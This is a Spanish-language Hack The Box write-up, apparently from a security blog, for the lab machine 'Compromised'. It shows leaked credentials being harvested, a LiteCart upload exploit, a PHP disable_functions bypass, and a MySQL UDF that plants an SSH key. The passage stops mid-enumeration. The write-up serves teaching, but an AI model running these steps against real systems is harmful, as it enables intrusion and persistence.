@@ -1,0 +1,814 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/piece.png">
+
+<title>Firtsmiracle Blog de Ciberseguridad</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Maquina Compromised - htb writeup | Firtsmiracle blog de Ciberseguridad</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Maquina Compromised - htb writeup" />
+<meta name="author" content="Firtsmiracle" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Hoy vamos a resolver la máquina Compromised de la plataforma de hackthebox correspondiente a una linux dificultad hard, la cual va a ser explotada , aprovechando información leakeada de credenciales y utilizando un exploit correspondiente a litercart que conjunto al crearnos una función propia en php que nos derive en la ejecución de comandos, despues aprovecharemos el concepto de UDF en mysql, para poder ejecutar una función personalisada que nos permita ganar acceso al sistema, donde obtendremos credenciales validas de un archivo log y finalmente a partir del analisis de un rootkit ganar tener acceso al sistema como el usuario privilegiado rooot." />
+<meta property="og:description" content="Hoy vamos a resolver la máquina Compromised de la plataforma de hackthebox correspondiente a una linux dificultad hard, la cual va a ser explotada , aprovechando información leakeada de credenciales y utilizando un exploit correspondiente a litercart que conjunto al crearnos una función propia en php que nos derive en la ejecución de comandos, despues aprovecharemos el concepto de UDF en mysql, para poder ejecutar una función personalisada que nos permita ganar acceso al sistema, donde obtendremos credenciales validas de un archivo log y finalmente a partir del analisis de un rootkit ganar tener acceso al sistema como el usuario privilegiado rooot." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/htb-writeup-Compromissed" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/htb-writeup-Compromissed" />
+<meta property="og:site_name" content="Firtsmiracle blog de Ciberseguridad" />
+<meta property="og:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Compromissed/banner.jpg" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-06-13T00:00:00+00:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Compromissed/banner.jpg" />
+<meta property="twitter:title" content="Maquina Compromised - htb writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Firtsmiracle"},"dateModified":"2023-06-13T00:00:00+00:00","datePublished":"2023-06-13T00:00:00+00:00","description":"Hoy vamos a resolver la máquina Compromised de la plataforma de hackthebox correspondiente a una linux dificultad hard, la cual va a ser explotada , aprovechando información leakeada de credenciales y utilizando un exploit correspondiente a litercart que conjunto al crearnos una función propia en php que nos derive en la ejecución de comandos, despues aprovecharemos el concepto de UDF en mysql, para poder ejecutar una función personalisada que nos permita ganar acceso al sistema, donde obtendremos credenciales validas de un archivo log y finalmente a partir del analisis de un rootkit ganar tener acceso al sistema como el usuario privilegiado rooot.","headline":"Maquina Compromised - htb writeup","image":"http://localhost:4000/assets/images/HTB/htb-writeup-Compromissed/banner.jpg","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/htb-writeup-Compromissed"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/piece.png"},"name":"Firtsmiracle"},"url":"http://localhost:4000/hackthebox/htb-writeup-Compromissed"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<!-- CSS -->
+<link href="/assets/css/prism.css" rel="stylesheet">
+<!-- SCSS can't be processed by browser, so we use .CSS to fix it -->
+<link href="/assets/css/theme.css" rel="stylesheet">
+<link href="/assets/css/modal.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h2>BLog de Ciberseguridad</h2><br><br>
+        <li><a href="/" id="menu-home">Inicio</a></li>
+        <li><a href="/categories#articulos">Artículos</a></li>
+        <li><a href="/categories#hackthebox" id="menu-hackthebox">HackTheBox</a></li>
+        <li><a href="/categories#novedades" id="menu-tryhackme">Novedades</a></li>
+        <li><a href="/tags">Tags</a></li>
+        <li><a href="/about" id="menu-aboutme">Información</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Buscar..."/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/piece.png" alt="Firtsmiracle blog de Ciberseguridad">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <script defer src="/assets/js/lightbox.js"></script>
+
+<div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">Maquina Compromised - htb writeup</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/?s=250&d=mm&r=x" alt="">
+            
+        </div>            
+        <div>
+        Firtmiracle <a targ="_blank" class="text-info"></a> el 
+        <span class="post-date"><time class="post-date" datetime="2023-06-13">13 Jun 2023</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="/assets/images/HTB/htb-writeup-Compromissed/banner.jpg" alt="Maquina Compromised - htb writeup">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Hoy vamos a resolver la máquina <code>Compromised</code> de la plataforma de <code>hackthebox</code> correspondiente a una <code>linux</code> dificultad hard, la cual va a ser explotada , aprovechando información leakeada de credenciales y utilizando un exploit correspondiente a <code>litercart</code> que conjunto al crearnos una función propia en <code>php</code> que nos derive en la ejecución de comandos, despues aprovecharemos el concepto de <code>UDF</code> en mysql, para poder ejecutar una función personalisada que nos permita ganar acceso al sistema, donde obtendremos credenciales validas de un archivo log y finalmente a partir del analisis de un <code>rootkit</code> ganar tener acceso al sistema como el usuario privilegiado <code>rooot</code>.</p>
+
+<p>Vamos a comenzar creando un directorio con el nombre de la maquina:</p>
+
+<pre><code class="language-bash">❯ mkdir Compromissed
+❯ ls
+ Compromissed
+</code></pre>
+<p>Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:</p>
+
+<pre><code class="language-bash">❯ which mkt
+mkt () {
+	mkdir {nmap,content,exploits,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap   scripts
+</code></pre>
+
+<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>
+
+<p>Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando <code>ping</code>:</p>
+
+<pre><code class="language-bash">❯ ping -c 1 10.10.10.207
+PING 10.10.10.207 (10.10.10.207) 56(84) bytes of data.
+64 bytes from 10.10.10.207: icmp_seq=1 ttl=63 time=207 ms
+
+--- 10.10.10.207 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 206.547/206.547/206.547/0.000 ms
+</code></pre>
+<p>Vemos que la maquina nos responde, ahora procederemos a el escaneo de puertos con la ayuda de <code>nmap</code>:</p>
+
+<h3 id="escaneo-de-puertos">Escaneo de Puertos</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="#enumeracion">-p-</a></td>
+      <td style="text-align: left">Escaneamos todos los 65535 puertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">–open</a></td>
+      <td style="text-align: left">Solo los puertos que estén abiertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-v</a></td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando (verbose).</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-oG</a></td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para que mediante una funcion de <a href="https://s4vitar.github.io/">S4vitar</a> nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre <code>allPorts</code>:</p>
+
+<pre><code class="language-java">❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.207 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-13 15:35 GMT
+Initiating SYN Stealth Scan at 15:35
+Scanning 10.10.10.207 [65535 ports]
+Discovered open port 80/tcp on 10.10.10.207
+Discovered open port 22/tcp on 10.10.10.207
+Completed SYN Stealth Scan at 15:35, 26.53s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.207
+Host is up, received user-set (0.13s latency).
+Scanned at 2023-06-13 15:35:29 GMT for 26s
+Not shown: 65533 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 26.65 seconds
+           Raw packets sent: 131087 (5.768MB) | Rcvd: 22 (968B)
+</code></pre>
+<p>Podemos ver que los puertos que se encuentran abiertos son el puerto <code>22 ssh</code> y el <code>80 http</code>.</p>
+
+<h3 id="escaneo-de-version-y-servicios">Escaneo de Version y Servicios.</h3>
+
+<pre><code class="language-java">❯ nmap -sCV -p22,80 10.10.10.207 -oN targeted
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-13 15:36 GMT
+Nmap scan report for 10.10.10.207
+Host is up (0.21s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 6e:da:5c:8e:8e:fb:8e:75:27:4a:b9:2a:59:cd:4b:cb (RSA)
+|   256 d5:c5:b3:0d:c8:b6:69:e4:fb:13:a3:81:4a:15:16:d2 (ECDSA)
+|_  256 35:6a:ee:af:dc:f8:5e:67:0d:bb:f3:ab:18:64:47:90 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-title: Legitimate Rubber Ducks | Online Store
+|_Requested resource was http://10.10.10.207/shop/en/
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.60 seconds
+</code></pre>
+<p>Visulizamos informacion interesante de los puertos escaneados:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th>Servicio</th>
+      <th>Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td>SSH</td>
+      <td>OpenSSH 7.6p1 Ubuntu 4ubuntu0.3</td>
+    </tr>
+    <tr>
+      <td>80</td>
+      <td>HTTP</td>
+      <td>Apache httpd 2.4.29</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Seguidamente vamos a usar la herramienta <code>whatweb</code> para ver por consola el gestor de contenido de la pagina web.</p>
+
+<pre><code class="language-bash">❯ whatweb http://10.10.10.207
+http://10.10.10.207 [302 Found] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.207], RedirectLocation[/shop]
+http://10.10.10.207/shop [301 Moved Permanently] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.207], RedirectLocation[http://10.10.10.207/shop/], Title[301 Moved Permanently]
+http://10.10.10.207/shop/ [302 Found] Apache[2.4.29], Content-Language[en], Cookies[LCSESSID,cart[uid],currency_code,language_code], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.207], RedirectLocation[http://10.10.10.207/shop/en/], X-Powered-By[LiteCart]
+http://10.10.10.207/shop/en/ [200 OK] Apache[2.4.29], Content-Language[en], Cookies[LCSESSID,cart[uid],currency_code,language_code], Country[RESERVED][ZZ], Email[admin@compromised.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.207], JQuery[3.3.1], Open-Graph-Protocol[website], PasswordField[password], Script, Title[Legitimate Rubber Ducks | Online Store], X-Powered-By[LiteCart]
+</code></pre>
+
+<p>La herramienta nos reporta bastante información la cual incluye rutas, usuaruos y dominios, vamos a proceder a abrir la web en el navegador. Vemos que el servicio corresponde a <code>Litecart</code>.</p>
+
+<blockquote>
+  <p>LiteCart es una plataforma de comercio electrónico gratuita fundada por el desarrollador web sueco T. Almroth. LiteCart está inspirado en lo mejor de los mundos y lo que podría haberse hecho mejor en soluciones alternativas de comercio electrónico.</p>
+</blockquote>
+
+<p><img src="/assets/images/HTB/htb-writeup-Compromissed/compro1.PNG" alt="" /></p>
+
+<h2 id="explotación">Explotación <a href="#explotación">#</a></h2>
+
+<p>Vamos a comenzar descubriendo rutas en la web, para ello primero usaremos unos de los scripts de nmap <code>http-enum</code>.</p>
+
+<pre><code class="language-bash">❯ nmap --script http-enum -p80 10.10.10.207 -oN webScan
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-13 15:42 GMT
+Nmap scan report for 10.10.10.207
+Host is up (0.22s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum: 
+|_  /backup/: Backup folder w/ directory listing
+
+Nmap done: 1 IP address (1 host up) scanned in 32.04 seconds
+</code></pre>
+
+<p>Descubirmos una ruta valida que dentro tiene un archivo comprimido que procederemos a traer y descomprimir en nuestra maquina.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Compromissed/compro2.PNG" alt="" /></p>
+
+<p>Una vez lo descomprimimos en nuestra maquina, podemos ver un directorio de nombre <code>shop</code> el cual incluye a su vez varios directorios y archivos, en los cuale</p>
+
+<pre><code class="language-bash">❯ cd shop
+❯ ls
+ admin   cache   data   ext   images   includes   logs   pages   vqmod   favicon.ico   index.php  ﮧ robots.txt
+</code></pre>
+
+<p>Una vez dentro vamos a tratar de buscar credenciales, filtrando por archivos de configuración con la siguiente expresion:</p>
+
+<pre><code class="language-bash">❯ find . -name \*config\* | xargs cat | grep -iE "user|pass|key"
+    'name' =&gt; language::translate('title_users', 'Users'),
+    'default' =&gt; 'users',
+      'users' =&gt; 'users.inc.php',
+      'edit_user' =&gt; 'edit_user.inc.php',
+    order by priority, `key`;"
+      'title' =&gt; language::translate('settings_group:title_'.$group['key'], $group['name']),
+      'doc' =&gt; $group['key'],
+    $app_config['docs'][$group['key']] = 'settings.inc.php';
+      'icon' =&gt; 'fa-user',
+      'key' =&gt; 'product_modal_window',
+      'key' =&gt; 'sidebar_parallax_effect',
+      'key' =&gt; 'compact_category_tree',
+      'key' =&gt; 'cookie_acceptance',
+  define('DB_USERNAME', 'root');
+  define('DB_PASSWORD', 'changethis');
+  define('DB_TABLE_USERS',                             '`'. DB_DATABASE .'`.`'. DB_TABLE_PREFIX . 'users`');
+ Password Encryption Salt
+  define('PASSWORD_SALT', 'kg1T5n2bOEgF8tXIdMnmkcDUgDqOLVvACBuYGGpaFkOeMrFkK0BorssylqdAP48Fzbe8ylLUx626IWBGJ00ZQfOTgPnoxue1vnCN1amGRZHATcRXjoc6HiXw0uXYD9mI');
+</code></pre>
+
+<p>Obtenemos unas credenciales correspondientes a la base de datos <code>root: changethis</code> que procederemos a almancenar.</p>
+
+<p>Ahora podemos ver qu dentro del directorio <code>admin</code>, vemos un archivo de nombre <code>login.php</code>, validamos si existe una ruta correspondiente en la web y efectivamente existe.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Compromissed/compro3.PNG" alt="" /></p>
+
+<p>despues al leer el archivo <code>login.php</code>, podemos ver que comentada una ruta oculta con un archivo txt.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Compromissed/compro4.PNG" alt="" /></p>
+
+<p>Al validar la ruta obtenemos nuevas credenciales.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Compromissed/compro5.PNG" alt="" /></p>
+
+<p>Validamos las credenciales y nos conectamos al servicio.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Compromissed/compro6.PNG" alt="" /></p>
+
+<p>Ahora vamos a buscar si existen vulnerabilidades asociadas a <code>litecart</code> y vemos que existe un exploit en python2.</p>
+
+<pre><code class="language-bash">❯ searchsploit litecart
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                       |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+LiteCart 2.1.2 - Arbitrary File Upload                                                                                                               | php/webapps/45267.py
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+</code></pre>
+
+<p>Nos traemos el exploit y lo ejecutamos con los parametros especificos</p>
+
+<pre><code class="language-bash">❯ python2 litecart.py -t http://10.10.10.207/shop/admin/ -u 'admin' -p 'theNextGenSt0r3!~'
+Shell =&gt; http://10.10.10.207/shop/admin/../vqmod/xml/D5B8I.php?c=id
+</code></pre>
+
+<p>validamos en la web el enlace generado pero vemos que no funciona, seguidamente vamos a modificar el exploit cambiando el nombre aleatorio que nis genera por uno estatico de nombre <code>shell.php</code> y ejecutaremos dentro del arhivo <code>phpinfo()</code> para ver las funciones que estan desabilitadas.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Compromissed/compro7.PNG" alt="" /></p>
+
+<p>Volvemos a ejecutar nuevamente el exploit.</p>
+
+<pre><code class="language-bash">❯ python2 litecart.py -t http://10.10.10.207/shop/admin/ -u 'admin' -p 'theNextGenSt0r3!~'
+Shell =&gt; http://10.10.10.207/shop/admin/../vqmod/xml/shell.php
+</code></pre>
+
+<p>Vamos al enlace generado y vemos la lista funciones desabilitadas, y vemos que que por ello nuestro exploit no funciona ya que por defecto emplea la función <code>system</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Compromissed/compro8.PNG" alt="" /></p>
+
+<p>Vemos que estamos muy limitados en cuanto a funciones, pero debemos recordar que podemos crear nuestra propia función que nos permita ejecutar comandos a nivel de sistema. Para ello existe una utilidad de la cual nos podemos apoyar.</p>
+
+<p><a href="https://packetstormsecurity.com/files/154728/PHP-7.3-disable_functions-Bypass.html">https://packetstormsecurity.com/files/154728/PHP-7.3-disable_functions-Bypass.html</a></p>
+
+<p>Para ello primero debemos crearnos un archivo con el contenido que nos proporcionan, en este casollamere al archivo <code>funct.php</code>. Dentro lo que hace el codigo es crear una función con el nombre <code>pwn</code>, pero puedes llamar a la función como quieras y tambien define un parametro el cual establecere con <code>$_REQUEST['cmd]</code>, para que atravez de <code>cmd</code> pueda ejecutar instrucciones.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Compromissed/compro9.PNG" alt="" /></p>
+
+<p>Ahora modificaremos el exploit <code>litercart</code>, para que nos suba el contenido de la nueva función creada <code>funct.php</code></p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Compromissed/compro10.PNG" alt="" /></p>
+
+<p>Ejecutamos el exploit, vamos al enlance y esta vez podemos ejecutar comandos.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Compromissed/compro11.PNG" alt="" /></p>
+
+<p>Ahora si queremos mandarnos una revershell, vemos que no tenemos conexión.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Compromissed/compro12.PNG" alt="" /></p>
+
+<p>Para simular una <code>tty</code> utilizaremos la herramienta <code>tty_over_http</code> de s4vitar.</p>
+
+<ul>
+  <li><a href="https://github.com/s4vitar/ttyoverhttp">https://github.com/s4vitar/ttyoverhttp</a></li>
+</ul>
+
+<p>El uso es simple solo debemos ingresar la url de nuestra shell en la solicitud <code>requests</code></p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Compromissed/compro13.PNG" alt="" /></p>
+
+<p>De esta forma podemos movernos mas comodamente desde consola, adicionalemente vamos a otorgarnos un aconsola.</p>
+
+<pre><code class="language-python">❯ python3 tty_over_http.py
+&gt; whoami
+&gt; www-data
+ls
+&gt; D5B8I.php
+fmiracle.php
+index.html
+shell.php
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+&gt; www-data@compromised:/var/www/html/shop$
+ls
+&gt; ls
+admin  data  favicon.ico  includes   logs   robots.txt
+cache  ext   images	 index.php  pages  vqmod
+</code></pre>
+
+<p>Recordemos que anteriormente obtuvimos credenciales de la base de datos <code>root:changethis</code></p>
+
+<p>Validamos las credenciales y procedemos a enumerar la base de datos, enumerando la base de datos, encontramos un usuario y un hash, pero no conseguimos romper el hash.</p>
+
+<pre><code class="language-sql">www-data@compromised:/var/www/html/shop$
+ mysql -uroot -pchangethis -e "select username, password from lc_users;" ecom
+&lt; -e "select username, password from lc_users;" ecom
+mysql: [Warning] Using a password on the command line interface can be insecure.
++----------+------------------------------------------------------------------+
+| username | password                                                         |
++----------+------------------------------------------------------------------+
+| admin    | 44c79f6669819c0185822c587597b46c98c3cff90512318cb84d8e7c190de8b4 |
++----------+------------------------------------------------------------------+
+www-data@compromised:/var/www/html/shop$
+</code></pre>
+<p>Al seguir enumerando el sistema, vemos que existe un usuario <code>mysql</code>, el cual tiene asignada una bash.</p>
+
+<pre><code class="language-bash">&gt; cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+sysadmin:x:1000:1000:compromise:/home/sysadmin:/bin/bash
+mysql:x:111:113:MySQL Server,,,:/var/lib/mysql:/bin/bash
+red:x:1001:1001::/home/red:/bin/false
+</code></pre>
+
+<p>Como el usuario <code>mysql</code> tiene una bash podria estar relacionado a los <code>UDF</code>, que nos permiten definir funciones especificas.</p>
+
+<blockquote>
+  <p>UDF: una Función Definida por el Usuario (UDF) es un trozo de código que extiende la funcionalidad de un servidor MySQL añadiendo una nueva función que se comporta igual que una función nativa (incorporada) de MySQL, como abs() o concat().</p>
+</blockquote>
+
+<p>Para poder listar estas funciones, haciendo uso de la mismas credenciales de la base de datos, podemos hacerlo ejecutando:</p>
+
+<pre><code class="language-sql">mysql -uroot -pchangethis -e "select * from mysql.func"
+&lt;l -uroot -pchangethis -e "select * from mysql.func"
+mysql: [Warning] Using a password on the command line interface can be insecure.
++----------+-----+-------------+----------+
+| name     | ret | dl          | type     |
++----------+-----+-------------+----------+
+| exec_cmd |   0 | libmysql.so | function |
++----------+-----+-------------+----------+
+</code></pre>
+
+<p>vemos que existe una función definida de nombre <code>exec_cmd</code>, que al ejecutar un comando nos lo realiza exitosamente.</p>
+
+<pre><code class="language-sql">mysql -uroot -pchangethis -e "select exec_cmd('pwd');"
+&lt;ql -uroot -pchangethis -e "select exec_cmd('pwd');"
+mysql: [Warning] Using a password on the command line interface can be insecure.
++------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| exec_cmd('pwd')                                                                                                                                                                                                                                                                                                     |
++------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| /var/lib/mysql
+</code></pre>
+
+<p>No podemos entablarnos una reverse shell, pero recordemos que el puerto <code>22</code> esta abierto, asi que podriamos usar los principios basicos de claves ssh, para introducir nuestra clave publica en el directorio del usuario como <code>authorized_keys</code></p>
+
+<p>Creamos el directorio <code>.ssh</code></p>
+
+<pre><code class="language-sql">mysql -uroot -pchangethis -e "select exec_cmd('mkdir /var/lib/mysql/.ssh/');"
+&lt;-e "select exec_cmd('mkdir /var/lib/mysql/.ssh/');"
+mysql: [Warning] Using a password on the command line interface can be insecure.
++------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| exec_cmd('mkdir /var/lib/mysql/.ssh/')                                 
+</code></pre>
+<p>Introducimos nuestra clave privada, renombrandola como <code>authorized_keys</code></p>
+
+<pre><code class="language-sql">mysql -uroot -pchangethis -e "select exec_cmd('echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSSuSh/zi5KspA8ZYqWIxduahcDanjzfout7+OVdf5zD6rme/9U0gKI5qKUV+aPk2KwyRK0se06hdubAKQJ0xNciuPoOMSiN8UqbikaxxUNNq2wUBdzGEQ93gFzpHD1VJ+LHGyJJO82x/awHBT9d7m1lgqPxuIPKC/CZWMR/8CLuC649eSaoJ5HaxeMDHNNmKu511aZUxCetjVhQxRdI3unUz7h+Bg0x64v9HYC1oOcilMJAdOXNsIJLDpeDajnz/bYjVjqx1fe4ztyhneoMF1/h4xc0165Vb2YT5AezAOuY+yZlRjkKlYuuvxGulZ1P72Pc1hO/4p3/waHz53JwfrlKtGzo0Vq2H+ajXXmNKhPbv5g531F0j75DYTMXs/oQFntvcqxXQCqqBmKsY0Gf4yy3M5D/KNOW4Z8Naeauu+XFHfqd/jTzaXck24XFYfZj1VAdn7XqD30Q3QIhESWj5i3n9E7kohx5PhgU7OB5u6K4YPVXjjOQ30iwWGQcnYAeU= root@hack4u &gt; /var/lib/mysql/.ssh/authorized_keys');"
+&lt;ot@hack4u &gt; /var/lib/mysql/.ssh/authorized_keys');"
+mysql: [Warning] Using a password on the command line interface can be insecure.
+</code></pre>
+
+<pre><code class="language-bash">❯ ssh mysql@10.10.10.207
+Last login: Thu Sep  3 11:52:44 2020 from 10.10.14.2
+mysql@compromised:~$ whoami
+mysql
+</code></pre>
+
+<p>Una vez dentro como el usuario <code>mysql</code>, vamos a buscar de manera recursiva por la palabra <code>sysadmin</code>, encontramos un archivo <code>lib/mysql/strace-log.dat</code>.</p>
+
+<pre><code class="language-bash">mysql@compromised:/var$ grep -ri "sysadmin" 2&gt;/dev/null
